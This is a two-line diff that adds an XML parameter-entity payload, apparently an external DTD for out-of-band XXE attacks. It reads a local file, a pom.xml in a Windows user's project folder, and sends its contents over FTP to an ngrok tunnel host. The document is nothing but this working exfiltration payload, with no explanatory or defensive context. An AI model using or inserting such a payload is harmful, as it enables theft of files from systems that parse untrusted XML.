@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///C:/Users/Admin/IdeaProjects/Lohong2/pom.xml">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://0.tcp.ap.ngrok.io:14460/%d;'>">
